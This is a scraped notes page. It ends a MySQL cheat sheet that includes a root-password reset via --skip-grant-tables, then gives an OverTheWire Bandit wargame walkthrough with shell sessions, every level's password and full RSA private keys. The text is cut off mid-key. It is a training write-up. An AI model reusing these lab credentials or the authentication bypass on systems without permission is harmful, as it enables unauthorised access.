field1 ALTER TABLE table ADD INDEX (field);  Change field order ALTER TABLE table MODIFY field1 type1 FIRST ALTER TABLE table MODIFY field1 type1 AFTER another_field ALTER TABLE table CHANGE old_name_field1 new_name_field1 type1 FIRST ALTER TABLE table CHANGE old_name_field1 new_name_field1 type1 AFTER another_field  Keys CREATE TABLE table (..., PRIMARY KEY (field1, field2)) CREATE TABLE table (..., FOREIGN KEY (field1, field2) REFERENCES table2 (t2_field1, t2_field2))  Users and Privileges GRANT ALL PRIVILEGES ON base.* TO 'user'@'localhost' IDENTIFIED BY 'password'; GRANT SELECT, INSERT, DELETE ON base.* TO 'user'@'localhost' IDENTIFIED BY 'password'; REVOKE ALL PRIVILEGES ON base.* FROM 'user'@'host'; -- one permission only REVOKE ALL PRIVILEGES, GRANT OPTION FROM 'user'@'host'; -- all permissions  SET PASSWORD = PASSWORD('new_pass') SET PASSWORD FOR 'user'@'host' = PASSWORD('new_pass') SET PASSWORD = OLD_PASSWORD('new_pass')  DROP USER 'user'@'host'  Host ‘%’ indicates any host.\nMain Data Types TINYINT (1o: -217+128) SMALLINT (2o: +-65 000) MEDIUMINT (3o: +-16 000 000) INT (4o: +- 2 000 000 000) BIGINT (8o: +-9.10^18)  Precise interval: -(2^(8*N-1)) -\u0026gt; (2^8*N)-1  ⚠ INT(2) = \u0026ldquo;2 digits displayed\u0026rdquo; \u0026ndash; NOT \u0026ldquo;number with 2 digits max\u0026rdquo;\nFLOAT(M,D) DOUBLE(M,D) FLOAT(D=0-\u0026gt;53)  ⚠ 8,3 -\u0026gt; 12345,678 \u0026ndash; NOT 12345678,123!\nTIME (HH:MM) YEAR (AAAA) DATE (AAAA-MM-JJ) DATETIME (AAAA-MM-JJ HH:MM; années 1000-\u0026gt;9999) TIMESTAMP (like DATETIME, but 1970-\u0026gt;2038, compatible with Unix)  VARCHAR (single-line; explicit size) TEXT (multi-lines; max size=65535) BLOB (binary; max size=65535)  Variants for TEXT\u0026amp;BLOB: TINY (max=255), MEDIUM (max=~16000), and LONG (max=4Go). Ex: VARCHAR(32), TINYTEXT, LONGBLOB, MEDIUMTEXT\nENUM ('value1', 'value2', ...) -- (default NULL, or '' if NOT NULL)  Reset Root Password /etc/init.d/mysql stop  mysqld_safe --skip-grant-tables  $ mysql # on another terminal mysql\u0026gt; UPDATE mysql.user SET password=PASSWORD('new_pass') WHERE user='root';  ### Switch back to the mysqld_safe terminal and kill the process using Control + \\ $ /etc/init.d/mysql start  Also see   Dummy data\n  Sources\n  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/ctfs/overthewire/bandit/",
	"title": "Bandit",
	"tags": ["OverTheWire"],
	"description": "Notes from Bandit challanges.",
	"content": "bandit Bandit0 bandit0@bandit$ ls readme bandit0@bandit$ cat readme boJ9jbbUNNfktd78OOpsqOltutMc3MY1 bandit0@bandit$ exit logout Connection to bandit.labs.overthewire.org closed.  bandit1 bandit1@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no bandit1@bandit$ ls - bandit1@bandit$ cat ./- CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9 bandit1@bandit$ logout Connection to bandit.labs.overthewire.org closed.  bandit2 bandit2@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit2@bandit.labs.overthewire.orgs password: bandit2@bandit $ ls spaces in this filename bandit2@bandit $ cat spaces\\ in\\ this\\ filename UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK bandit2@bandit $ logout Connection to bandit.labs.overthewire.org closed.  bandit3 bandit3@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit3@bandit.labs.overthewire.orgs password: bandit3@bandit $ ls inhere bandit3@bandit $ cd inhere/ bandit3@bandit:~/inhere$ ls -la total 12 drwxr-xr-x 2 root root 4096 Oct 16 2018 . drwxr-xr-x 3 root root 4096 Oct 16 2018 .. -rw-r----- 1 bandit4 bandit3 33 Oct 16 2018 .hidden bandit3@bandit:~/inhere$ cat .hidden pIwrPrtPN36QITSp3EQaw936yaFoFgAB bandit3@bandit:~/inhere$ logout Connection to bandit.labs.overthewire.org closed.  Bandit4 /wargames/overthewire/bandit$ bandit4@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit4@bandit.labs.overthewire.orgs password: bandit4@bandit $ ls -la total 24 drwxr-xr-x 3 root root 4096 Oct 16 2018 . drwxr-xr-x 41 root root 4096 Oct 16 2018 .. -rw-r--r-- 1 root root 220 May 15 2017 .bash_logout -rw-r--r-- 1 root root 3526 May 15 2017 .bashrc drwxr-xr-x 2 root root 4096 Oct 16 2018 inhere -rw-r--r-- 1 root root 675 May 15 2017 .profile bandit4@bandit $ cd inhere/ bandit4@bandit:~/inhere$ ls -la total 48 drwxr-xr-x 2 root root 4096 Oct 16 2018 . drwxr-xr-x 3 root root 4096 Oct 16 2018 .. -rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file00 -rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file01 -rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file02 -rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file03 -rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file04 -rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file05 -rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file06 -rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file07 -rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file08 -rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file09 bandit4@bandit:~/inhere$ cat ./-file0* | strings w$N?c ZP*E koReBOKuIDDepwhWk7jZC0RTdopnAYKh bandit4@bandit:~/inhere$ logout Connection to bandit.labs.overthewire.org closed.  bandit5 bandit5@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit5@bandit.labs.overthewire.orgs password: bandit5@bandit $ ls inhere bandit5@bandit $ cd inhere/ bandit5@bandit:~/inhere$ ls -la total 88 drwxr-x--- 22 root bandit5 4096 Oct 16 2018 . drwxr-xr-x 3 root root 4096 Oct 16 2018 .. drwxr-x--- 2 root bandit5 4096 Oct 16 2018 maybehere00 drwxr-x--- 2 root bandit5 4096 Oct 16 2018 maybehere01 drwxr-x--- 2 root bandit5 4096 Oct 16 2018 maybehere02 drwxr-x--- 2 root bandit5 4096 Oct 16 2018 maybehere03 drwxr-x--- 2 root bandit5 4096 Oct 16 2018 maybehere04 drwxr-x--- 2 root bandit5 4096 Oct 16 2018 maybehere05 drwxr-x--- 2 root bandit5 4096 Oct 16 2018 maybehere06 drwxr-x--- 2 root bandit5 4096 Oct 16 2018 maybehere07 drwxr-x--- 2 root bandit5 4096 Oct 16 2018 maybehere08 drwxr-x--- 2 root bandit5 4096 Oct 16 2018 maybehere09 drwxr-x--- 2 root bandit5 4096 Oct 16 2018 maybehere10 drwxr-x--- 2 root bandit5 4096 Oct 16 2018 maybehere11 drwxr-x--- 2 root bandit5 4096 Oct 16 2018 maybehere12 drwxr-x--- 2 root bandit5 4096 Oct 16 2018 maybehere13 drwxr-x--- 2 root bandit5 4096 Oct 16 2018 maybehere14 drwxr-x--- 2 root bandit5 4096 Oct 16 2018 maybehere15 drwxr-x--- 2 root bandit5 4096 Oct 16 2018 maybehere16 drwxr-x--- 2 root bandit5 4096 Oct 16 2018 maybehere17 drwxr-x--- 2 root bandit5 4096 Oct 16 2018 maybehere18 drwxr-x--- 2 root bandit5 4096 Oct 16 2018 maybehere19 bandit5@bandit:~/inhere$ find . -type f -readable ! -executable -size 1033c -exec cat {} \\; | strings DXjZPULLxYr17uwoI01bNLQbtFemEgo7 bandit5@bandit:~/inhere$ logout Connection to bandit.labs.overthewire.org closed.  bandit6 bandit6@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit6@bandit.labs.overthewire.orgs password: bandit6@bandit $ ls -la total 20 drwxr-xr-x 2 root root 4096 Oct 16 2018 . drwxr-xr-x 41 root root 4096 Oct 16 2018 .. -rw-r--r-- 1 root root 220 May 15 2017 .bash_logout -rw-r--r-- 1 root root 3526 May 15 2017 .bashrc -rw-r--r-- 1 root root 675 May 15 2017 .profile bandit6@bandit $ cd / bandit6@bandit:/$ find . -size 33c -group bandit6 -user bandit7 2\u0026gt; /dev/null -exec cat {} \\; HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs bandit6@bandit:/$ logout Connection to bandit.labs.overthewire.org closed.  bandit7 bandit7@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit7@bandit.labs.overthewire.orgs password: bandit7@bandit $ ls -la total 4108 drwxr-xr-x 2 root root 4096 Oct 16 2018 . drwxr-xr-x 41 root root 4096 Oct 16 2018 .. -rw-r--r-- 1 root root 220 May 15 2017 .bash_logout -rw-r--r-- 1 root root 3526 May 15 2017 .bashrc -rw-r----- 1 bandit8 bandit7 4184396 Oct 16 2018 data.txt -rw-r--r-- 1 root root 675 May 15 2017 .profile bandit7@bandit $ grep millionth data.txt millionth cvX2JJa4CFALtqS87jk27qwqGhBM9plV bandit7@bandit $ logout Connection to bandit.labs.overthewire.org closed.  bandit8 bandit8@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no11:09:49 This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit8@bandit.labs.overthewire.orgs password: bandit8@bandit $ ls -la total 56 drwxr-xr-x 2 root root 4096 Oct 16 2018 . drwxr-xr-x 41 root root 4096 Oct 16 2018 .. -rw-r--r-- 1 root root 220 May 15 2017 .bash_logout -rw-r--r-- 1 root root 3526 May 15 2017 .bashrc -rw-r----- 1 bandit9 bandit8 33033 Oct 16 2018 data.txt -rw-r--r-- 1 root root 675 May 15 2017 .profile bandit8@bandit $ sort data.txt | uniq -u UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR bandit8@bandit $ logout Connection to bandit.labs.overthewire.org closed.  bandit9 bandit9@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit9@bandit.labs.overthewire.orgs password: bandit9@bandit $ ls -la total 40 drwxr-xr-x 2 root root 4096 Oct 16 2018 . drwxr-xr-x 41 root root 4096 Oct 16 2018 .. -rw-r--r-- 1 root root 220 May 15 2017 .bash_logout -rw-r--r-- 1 root root 3526 May 15 2017 .bashrc -rw-r----- 1 bandit10 bandit9 19379 Oct 16 2018 data.txt -rw-r--r-- 1 root root 675 May 15 2017 .profile bandit9@bandit $ strings data.txt | grep '==' 2========== the ========== password ========== isa ========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk bandit9@bandit $ logout Connection to bandit.labs.overthewire.org closed.  bandit10 bandit10@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit10@bandit.labs.overthewire.orgs password: bandit10@bandit $ ls -la total 24 drwxr-xr-x 2 root root 4096 Oct 16 2018 . drwxr-xr-x 41 root root 4096 Oct 16 2018 .. -rw-r--r-- 1 root root 220 May 15 2017 .bash_logout -rw-r--r-- 1 root root 3526 May 15 2017 .bashrc -rw-r----- 1 bandit11 bandit10 69 Oct 16 2018 data.txt -rw-r--r-- 1 root root 675 May 15 2017 .profile bandit10@bandit $ cat data.txt VGhlIHBhc3N3b3JkIGlzIElGdWt3S0dzRlc4TU9xM0lSRnFyeEUxaHhUTkViVVBSCg== bandit10@bandit $ cat data.txt | base64 -d The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR bandit10@bandit $ logout Connection to bandit.labs.overthewire.org closed.  bandit11 bandit11@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit11@bandit.labs.overthewire.orgs password: bandit11@bandit $ ls -la total 24 drwxr-xr-x 2 root root 4096 Oct 16 2018 . drwxr-xr-x 41 root root 4096 Oct 16 2018 .. -rw-r--r-- 1 root root 220 May 15 2017 .bash_logout -rw-r--r-- 1 root root 3526 May 15 2017 .bashrc -rw-r----- 1 bandit12 bandit11 49 Oct 16 2018 data.txt -rw-r--r-- 1 root root 675 May 15 2017 .profile bandit11@bandit $ cat data.txt Gur cnffjbeq vf 5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHh bandit11@bandit $ cat data.txt | tr '[A-Za-z]' '[N-ZA-Mn-za-m]' The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu bandit11@bandit $ logout Connection to bandit.labs.overthewire.org closed.  bandit12 bandit12@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit12@bandit.labs.overthewire.orgs password: bandit12@bandit $ ls -la total 24 drwxr-xr-x 2 root root 4096 Oct 16 2018 . drwxr-xr-x 41 root root 4096 Oct 16 2018 .. -rw-r--r-- 1 root root 220 May 15 2017 .bash_logout -rw-r--r-- 1 root root 3526 May 15 2017 .bashrc -rw-r----- 1 bandit13 bandit12 2581 Oct 16 2018 data.txt -rw-r--r-- 1 root root 675 May 15 2017 .profile bandit12@bandit $ cat data.txt 00000000: 1f8b 0808 d7d2 c55b 0203 6461 7461 322e .......[..data2. 00000010: 6269 6e00 013c 02c3 fd42 5a68 3931 4159 bin..\u0026lt;...BZh91AY 00000020: 2653 591d aae5 9800 001b ffff de7f 7fff \u0026amp;SY............. 00000030: bfb7 dfcf 9fff febf f5ad efbf bbdf 7fdb ................ 00000040: f2fd ffdf effa 7fff fbd7 bdff b001 398c ..............9. 00000050: 1006 8000 0000 0d06 9900 0000 6834 000d ............h4.. 00000060: 01a1 a000 007a 8000 0d00 0006 9a00 d034 .....z.........4 00000070: 0d1a 3234 68d1 e536 a6d4 4000 341a 6200 ..24h..6..@.4.b. 00000080: 0069 a000 0000 0000 d003 d200 681a 0d00 .i..........h... 00000090: 0001 b51a 1a0c 201e a000 6d46 8068 069a ...... ...mF.h.. 000000a0: 6834 340c a7a8 3406 4000 0680 0001 ea06 h44...4.@....... 000000b0: 8190 03f5 4032 1a00 0343 4068 0000 0686 ....@2...C@h.... 000000c0: 8000 0320 00d0 0d00 0610 0014 1844 0308 ... .........D.. 000000d0: 04e1 c542 9ab8 2c30 f1be 0b93 763b fb13 ...B..,0....v;.. 000000e0: 50c4 c101 e008 3b7a 92a7 9eba 8a73 8d21 P.....;z.....s.! 000000f0: 9219 9c17 052b fb66 a2c2 fccc 9719 b330 .....+.f.......0 00000100: 6068 8c65 e504 5ec0 ae02 fa6d 16bc 904b `h.e..^....m...K 00000110: ba6c f692 356e c02b 0374 c394 6859 f5bb .l..5n.+.t..hY.. 00000120: 0f9f 528e 4272 22bb 103c 2848 d8aa 2409 ..R.Br\u0026quot;..\u0026lt;(H..$. 00000130: 24d0 d4c8 4b42 7388 ce25 6c1a 7ec1 5f17 $...KBs..%l.~._. 00000140: cc18 ddbf edc1 e3a4 67f1 7a4d 8277 c823 ........g.zM.w.# 00000150: 0450 2232 40e0 07f1 ca16 c6d6 ef0d ecc9 .P\u0026quot;2@........... 00000160: 8bc0 5e2d 4b12 8586 088e 8ca0 e67d a55c ..^-K........}.\\ 00000170: 2ca0 18c7 bfb7 7d45 9346 ea5f 2172 01e4 ,.....}E.F._!r.. 00000180: 5598 673f 45af 69b7 a739 7814 8706 04ed U.g?E.i..9x..... 00000190: 5442 1240 0796 6cc8 b2f6 1ef9 8d13 421d TB.@..l.......B. 000001a0: 461f 2e68 4d91 5343 34b5 56e7 46d0 0a0a F..hM.SC4.V.F... 000001b0: 72b7 d873 71d9 6f09 c326 402d dbc0 7cef r..sq.o..\u0026amp;@-..|. 000001c0: 53b1 df60 9ec7 f318 00df 3907 2e85 d85b S..`......9....[ 000001d0: 6a1a e105 0207 c580 e31d 82d5 8646 183c j............F.\u0026lt; 000001e0: 6a04 4911 101a 5427 087c 1f94 47a2 270d j.I...T'.|..G.'. 000001f0: ad12 fc5c 9ad2 5714 514f 34ba 701d fb69 ...\\..W.QO4.p..i 00000200: 8eed 0183 e2a1 53ea 2300 26bb bd2f 13df ......S.#.\u0026amp;../.. 00000210: b703 08a3 2309 e43c 44bf 75d4 905e 5f96 ....#..\u0026lt;D.u..^_. 00000220: 481b 362e e82d 9093 7741 740c e65b c7f1 H.6..-..wAt..[.. 00000230: 5550 f247 9043 5097 d626 3a16 da32 c213 UP.G.CP..\u0026amp;:..2.. 00000240: 2acd 298a 5c8a f0c1 b99f e2ee 48a7 0a12 *.).\\.......H... 00000250: 03b5 5cb3 0037 cece 773c 0200 00 ..\\..7..w\u0026lt;... bandit12@bandit $ mkdir /tmp/esc bandit12@bandit $ cd /tmp/esc bandit12@bandit:/tmp/esc$ bandit12@bandit:/tmp/esc$ cp ~/data.txt data.hex bandit12@bandit:/tmp/esc$ ls data.hex bandit12@bandit:/tmp/esc$ xxd -r data.hex \u0026gt;\u0026gt; reversedhex.out bandit12@bandit:/tmp/esc$ file reversedhex.out reversedhex.out: gzip compressed data, was \u0026quot;data2.bin\u0026quot;, last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix bandit12@bandit:/tmp/esc$ zcat reversedhex.out \u0026gt; zcat_out.1 bandit12@bandit:/tmp/esc$ file zcat_out.1 zcat_out.1: bzip2 compressed data, block size = 900k bandit12@bandit:/tmp/esc$ bzip2 -d zcat_out.1 bzip2: Cant guess original name for zcat_out.1 -- using zcat_out.1.out bandit12@bandit:/tmp/esc$ file zcat_out.1.out zcat_out.1.out: gzip compressed data, was \u0026quot;data4.bin\u0026quot;, last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix bandit12@bandit:/tmp/esc$ zcat zcat_out.1.out \u0026gt; zcat_out.2 bandit12@bandit:/tmp/esc$ file zcat_out.2 zcat_out.2: POSIX tar archive (GNU) bandit12@bandit:/tmp/esc$ tar xvf zcat_out.2 data5.bin bandit12@bandit:/tmp/esc$ file data5.bin data5.bin: POSIX tar archive (GNU) bandit12@bandit:/tmp/esc$ tar xvf data5.bin data6.bin bandit12@bandit:/tmp/esc$ file data6.bin data6.bin: bzip2 compressed data, block size = 900k bandit12@bandit:/tmp/esc$ bzip2 -d data6.bin bzip2: Cant guess original name for data6.bin -- using data6.bin.out bandit12@bandit:/tmp/esc$ file data6.bin.out data6.bin.out: POSIX tar archive (GNU) bandit12@bandit:/tmp/esc$ tar xvf data6.bin.out data8.bin bandit12@bandit:/tmp/esc$ file data8.bin data8.bin: gzip compressed data, was \u0026quot;data9.bin\u0026quot;, last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix bandit12@bandit:/tmp/esc$ zcat data8.bin \u0026gt; zcat_out.3 bandit12@bandit:/tmp/esc$ file zcat_out.3 zcat_out.3: ASCII text bandit12@bandit:/tmp/esc$ strings zcat_out.3 The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL bandit12@bandit:/tmp/esc$ logout Connection to bandit.labs.overthewire.org closed. bandit12@bandit $ mkdir /tmp/esc bandit12@bandit $ cd /tmp/esc bandit12@bandit:/tmp/esc$ touch unpackhex.sh bandit12@bandit:/tmp/esc$ chmod +x unpackhex.sh bandit12@bandit:/tmp/esc$ cp ~/data.txt data.hex bandit12@bandit:/tmp/esc$ xxd -r data.hex \u0026gt;\u0026gt; reversed.hex bandit12@bandit:/tmp/esc$ vim unpackhex.sh  #bin/bash # function to get filetype using file and cut function get_file_type () { file $1 | cut -d \u0026quot; \u0026quot; -f 2 } # function to match filetypes to correct command function decompress () { FILETYPE=$(get_file_type $1) echo \u0026quot;[+] $1 matched to $FILETYPE filetype\u0026quot; if [ \u0026quot;$FILETYPE\u0026quot; != \u0026quot;ASCII\u0026quot; ]; then FILENAME=\u0026quot;out_$RANDOM\u0026quot; fi if [ \u0026quot;$FILETYPE\u0026quot; = \u0026quot;gzip\u0026quot; ]; then zcat $1 \u0026gt; $FILENAME elif [ \u0026quot;$FILETYPE\u0026quot; = \u0026quot;bzip2\u0026quot; ]; then bzcat $1 \u0026gt; $FILENAME elif [ \u0026quot;$FILETYPE\u0026quot; = \u0026quot;POSIX\u0026quot; ]; then FILENAME=$(tar xvf $1) elif [ \u0026quot;$FILETYPE\u0026quot; = \u0026quot;ASCII\u0026quot; ]; then cat $FILENAME LOOP=0 else echo \u0026quot;$FILETYPE is unknown\u0026quot; fi sleep 1 } echo \u0026quot;[?] What file should we decompress? \u0026quot; read FILENAME LOOP=1 until [ $LOOP = 0 ] do decompress $FILENAME done  bandit12@bandit:/tmp/esc$ ./unpackhex.sh [?] What file should we decompress? reversed.hex [+] reversed.hex matched to gzip filetype [+] out_21267 matched to bzip2 filetype [+] out_14023 matched to gzip filetype [+] out_30556 matched to POSIX filetype [+] data5.bin matched to POSIX filetype [+] data6.bin matched to bzip2 filetype [+] out_30902 matched to POSIX filetype [+] data8.bin matched to gzip filetype [+] out_14824 matched to ASCII filetype The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL bandit12@bandit:/tmp/esc$ logout Connection to bandit.labs.overthewire.org closed.  bandit13 bandit13@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit13@bandit.labs.overthewire.orgs password: bandit13@bandit $ ls sshkey.private bandit13@bandit $ cat sshkey.private -----BEGIN RSA PRIVATE KEY----- MIIEpAIBAAKCAQEAxkkOE83W2cOT7IWhFc9aPaaQmQDdgzuXCv+ppZHa++buSkN+ gg0tcr7Fw8NLGa5+Uzec2rEg0WmeevB13AIoYp0MZyETq46t+jk9puNwZwIt9XgB ZufGtZEwWbFWw/vVLNwOXBe4UWStGRWzgPpEeSv5Tb1VjLZIBdGphTIK22Amz6Zb ThMsiMnyJafEwJ/T8PQO3myS91vUHEuoOMAzoUID4kN0MEZ3+XahyK0HJVq68KsV ObefXG1vvA3GAJ29kxJaqvRfgYnqZryWN7w3CHjNU4c/2Jkp+n8L0SnxaNA+WYA7 jiPyTF0is8uzMlYQ4l1Lzh/8/MpvhCQF8r22dwIDAQABAoIBAQC6dWBjhyEOzjeA J3j/RWmap9M5zfJ/wb2bfidNpwbB8rsJ4sZIDZQ7XuIh4LfygoAQSS+bBw3RXvzE pvJt3SmU8hIDuLsCjL1VnBY5pY7Bju8g8aR/3FyjyNAqx/TLfzlLYfOu7i9Jet67 xAh0tONG/u8FB5I3LAI2Vp6OviwvdWeC4nOxCthldpuPKNLA8rmMMVRTKQ+7T2VS nXmwYckKUcUgzoVSpiNZaS0zUDypdpy2+tRH3MQa5kqN1YKjvF8RC47woOYCktsD o3FFpGNFec9Taa3Msy+DfQQhHKZFKIL3bJDONtmrVvtYK40/yeU4aZ/HA2DQzwhe ol1AfiEhAoGBAOnVjosBkm7sblK+n4IEwPxs8sOmhPnTDUy5WGrpSCrXOmsVIBUf laL3ZGLx3xCIwtCnEucB9DvN2HZkupc/h6hTKUYLqXuyLD8njTrbRhLgbC9QrKrS M1F2fSTxVqPtZDlDMwjNR04xHA/fKh8bXXyTMqOHNJTHHNhbh3McdURjAoGBANkU 1hqfnw7+aXncJ9bjysr1ZWbqOE5Nd8AFgfwaKuGTTVX2NsUQnCMWdOp+wFak40JH PKWkJNdBG+ex0H9JNQsTK3X5PBMAS8AfX0GrKeuwKWA6erytVTqjOfLYcdp5+z9s 8DtVCxDuVsM+i4X8UqIGOlvGbtKEVokHPFXP1q/dAoGAcHg5YX7WEehCgCYTzpO+ xysX8ScM2qS6xuZ3MqUWAxUWkh7NGZvhe0sGy9iOdANzwKw7mUUFViaCMR/t54W1 GC83sOs3D7n5Mj8x3NdO8xFit7dT9a245TvaoYQ7KgmqpSg/ScKCw4c3eiLava+J 3btnJeSIU+8ZXq9XjPRpKwUCgYA7z6LiOQKxNeXH3qHXcnHok855maUj5fJNpPbY iDkyZ8ySF8GlcFsky8Yw6fWCqfG3zDrohJ5l9JmEsBh7SadkwsZhvecQcS9t4vby 9/8X4jS0P8ibfcKS4nBP+dT81kkkg5Z5MohXBORA7VWx+ACohcDEkprsQ+w32xeD qT1EvQKBgQDKm8ws2ByvSUVs9GjTilCajFqLJ0eVYzRPaY6f++Gv/UVfAPV4c+S0 kAWpXbv5tbkkzbS0eaLPTKgLzavXtQoTtKwrjpolHKIHUz6Wu+n4abfAIRFubOdN /+aLoRQ0yBDRbdXMsZN/jvY44eM+xRLdRVyMmdPtP8belRi2E2aEzA== -----END RSA PRIVATE KEY----- bandit13@bandit $ logout Connection to bandit.labs.overthewire.org closed. /wargames/overthewire/bandit$ mkdir bandit14 /wargames/overthewire/bandit$ vim bandit14/id_rsa * paste private key content here * /wargames/overthewire/bandit$ chmod 0400 /wargames/overthewire/bandit$ bandit14@bandit.labs.overthewire.org -p 2220 -ibandit14/id_rsa This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit14@bandit $ cat /etc/bandit_pass/bandit14 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e bandit14@bandit $ logout Connection to bandit.labs.overthewire.org closed.  bandit14 bandit14@bandit.labs.overthewire.org -p 2220 -i bandit14/id_rsa This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit14@bandit $ nc 127.0.0.1 30000 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e Correct! BfMYroe26WYalil77FoDi9qh59eK5xNr bandit14@bandit $ logout Connection to bandit.labs.overthewire.org closed.  bandit15 bandit15@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit15@bandit.labs.overthewire.orgs password: bandit15@bandit $ openssl s_client --connect 127.0.0.1:30001 -quiet depth=0 CN = localhost verify error:num=18:self signed certificate verify return:1 depth=0 CN = localhost verify return:1 BfMYroe26WYalil77FoDi9qh59eK5xNr Correct! cluFn7wTiGryunymYOu4RcffSxQluehd bandit15@bandit $ logout Connection to bandit.labs.overthewire.org closed.  bandit16 bandit16@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit16@bandit.labs.overthewire.orgs password: bandit16@bandit $ nmap 127.0.0.1 -p 31000-32000 Starting Nmap 7.40 ( https://nmap.org ) at 2019-09-11 13:57 CEST Nmap scan report for localhost (127.0.0.1) Host is up (0.00024s latency). Not shown: 999 closed ports PORT STATE SERVICE 31518/tcp open unknown 31790/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds bandit16@bandit $ openssl s_client --connect 127.0.0.1:31518 -quiet depth=0 CN = localhost verify error:num=18:self signed certificate verify return:1 depth=0 CN = localhost verify return:1 cluFn7wTiGryunymYOu4RcffSxQluehd cluFn7wTiGryunymYOu4RcffSxQluehd ^C bandit16@bandit $ openssl s_client --connect 127.0.0.1:31790 -quiet Correct! -----BEGIN RSA PRIVATE KEY----- MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama +TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT 8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM 